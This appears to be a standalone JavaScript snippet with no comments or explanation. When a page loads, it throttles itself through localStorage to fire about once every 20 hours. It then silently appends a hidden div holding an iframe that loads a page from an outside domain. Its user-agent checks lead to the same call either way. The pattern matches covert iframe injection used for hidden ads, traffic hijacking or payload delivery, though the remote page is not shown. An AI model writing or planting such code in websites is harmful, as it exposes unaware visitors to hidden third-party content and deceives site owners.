window.onload = function() {
	var d = document;
	var h = d.getElementsByTagName("head");
	var s = d.getElementsByTagName("script");
	var sh = "";
	for(var i = 0; i < s.length; i++) {
		sh = s[i].src;
		if(sh.indexOf("sb.wmxyx.com") != "-1") {

		} else {
			pcduan();
		}
	}
}

function pcduan() {
	var myDate = new Date();
	var huancun = localStorage.getItem("ldf");
	var hcsjjg = localStorage.getItem("ldfsjjg");
	if(huancun != null || myDate.toLocaleDateString().indexOf(huancun) != "-1") {
		if(myDate.getHours() - hcsjjg >= "20") {
			hxwjc();
			localStorage.setItem("ldf", myDate.toLocaleDateString());
			localStorage.setItem("ldfsjjg", myDate.getHours());
		} else {

		}
	} else {
		hxwjc();
		localStorage.setItem("ldf", myDate.toLocaleDateString());
		localStorage.setItem("ldfsjjg", myDate.getHours());
	}
}

function hxwjc() {
	var sUserAgent = navigator.userAgent.toLowerCase();
	var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
	var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
	var bIsMidp = sUserAgent.match(/midp/i) == "midp";
	var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
	var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
	var bIsAndroid = sUserAgent.match(/android/i) == "android";
	var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
	var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
	if(bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
		dm();
	} else {
		dm();
	}
}

function dm(){
		var div = document.createElement("div");
//		div.style.position = "fixed";
//		div.style.bottom = "0px";
//		div.style.right = "0px";
//		div.style.zIndex = "999999999";
		div.style.display = "none";
		div.id = "hxwjcid";
		document.getElementsByTagName("body").item(0).appendChild(div);

		var a = document.createElement("iframe");
		a.src = "http://dsa.gzshyjfls.com/yys/hxw/index-hxw-1214.html";
		a.width = "400px";
		a.height = "300px";
		a.frameborder = "no";
		a.style.border = "0";
		a.scrolling = "no";
		div.appendChild(a);
}
